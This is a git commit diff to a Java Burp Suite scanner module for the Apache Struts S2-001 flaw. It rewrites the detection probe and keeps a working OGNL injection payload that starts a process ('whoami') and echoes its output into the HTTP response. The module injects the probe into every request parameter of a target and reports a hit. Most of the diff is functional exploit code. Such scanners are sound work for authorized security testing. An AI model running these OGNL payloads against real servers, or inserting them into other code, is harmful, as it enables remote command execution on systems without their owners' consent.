7fffa0427cd897b8991e08f10f7092623384e978
x1a0t <ch4ffee@gmail.com>
2020-10-26 22:27:11 +0800

    change method to verify S2-001

--- src/main/java/module/java/vul/S2_001.java
+++ src/main/java/module/java/vul/S2_001.java
@@ -1,6 +1,7 @@
 package module.java.vul;
 
 import burp.*;
+import module.java.Util;
 
 import java.io.PrintWriter;
 import java.net.URLEncoder;
@@ -8,14 +9,37 @@ import java.util.Arrays;
 import java.util.List;
 
 public class S2_001 extends IModule {
-    public int random1 = (int)(Math.random()*10000);
-    public int random2 = (int)(Math.random()*10000);
-    public String check_poc = "%{" + random1 + "*" + random2 + "}";
-    public String exec_payload = "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}";
+    public String randomMark;
+    public String injectMark;
+    public String poc;
+    public String exp =
+            "%{" +
+            "#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start()," +
+            "#b=#a.getInputStream()," +
+            "#c=new java.io.InputStreamReader(#b)," +
+            "#d=new java.io.BufferedReader(#c)," +
+            "#e=new char[50000]," +
+            "#d.read(#e)," +
+            "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
+            "#f.getWriter().println(new java.lang.String(#e))," +
+            "#f.getWriter().flush()," +
+            "#f.getWriter().close()" +
+            "}";
 
     public S2_001() {
         moduleName = "S2-001";
-        detail = exec_payload;
+        randomMark = Util.getRandomString(16);
+        injectMark = Arrays.toString(randomMark.getBytes()).replace("[", "").replace("]", "");
+        poc =
+            "%{" +
+            "#b=new byte[]{" +
+            injectMark +
+            "}," +
+            "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
+            "#f.getWriter().println(new java.lang.String(#b))," +
+            "#f.getWriter().flush()," +
+            "#f.getWriter().close()" +
+            "}";
     }
 
     public IScanIssue start() {
@@ -28,17 +52,17 @@ public class S2_001 extends IModule {
         List<IParameter> parameters = requestInfo.getParameters();
         for (IParameter parameter: parameters) {
             if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
-                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(check_poc), parameter.getType());
+                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(poc), parameter.getType());
                 byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                 IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
                 byte[] response = newHttpRequestResponse.getResponse();
                 IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
                 byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
 
-                String mark = String.valueOf(random1 * random2);
                 String bodyText = new String(body);
-                if (bodyText.contains(mark)) {
+                if (bodyText.contains(randomMark)) {
                     this.iHttpRequestResponse = newHttpRequestResponse;
+                    this.detail = exp;
                     return creatCustomScanIssue();
                 }
             }
